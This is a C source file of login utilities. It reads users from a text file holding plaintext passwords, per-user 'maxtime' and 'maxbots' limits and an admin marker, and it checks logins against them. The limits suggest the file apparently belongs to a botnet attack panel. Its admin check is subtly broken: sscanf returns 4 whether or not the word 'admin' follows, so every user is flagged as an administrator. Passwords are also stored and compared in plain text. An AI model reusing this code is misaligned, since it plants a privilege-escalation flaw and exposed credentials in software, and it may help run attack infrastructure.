#include "headers/login_utils.h"
#include <stdio.h>
#include <string.h>

User users[MAX_USERS];
int user_count = 0;

void load_users() {
    FILE *file = fopen("database/logins.txt", "r");
    if (!file) return;
    
    char line[256];
    while (user_count < MAX_USERS && fgets(line, sizeof(line), file)) {
        users[user_count].is_admin = 0;
        
        if (sscanf(line, "%49s %49s %d %d admin", 
            users[user_count].user, 
            users[user_count].pass, 
            &users[user_count].maxtime, 
            &users[user_count].maxbots) == 4) {
            users[user_count].is_admin = 1;
        } 
        else if (sscanf(line, "%49s %49s %d %d", 
            users[user_count].user, 
            users[user_count].pass, 
            &users[user_count].maxtime, 
            &users[user_count].maxbots) != 4) {
            continue;
        }
        
        users[user_count].is_logged_in = 0;
        user_count++;
    }
    fclose(file);
}

int check_login(const char *user, const char *pass) {
    for (int i = 0; i < user_count; i++) {
        if (strncmp(user, users[i].user, sizeof(users[i].user)) == 0 && strncmp(pass, users[i].pass, sizeof(users[i].pass)) == 0) {
            if (users[i].is_logged_in) {
                return -2;
            }
            return i;
        }
    }
    return -1;
}
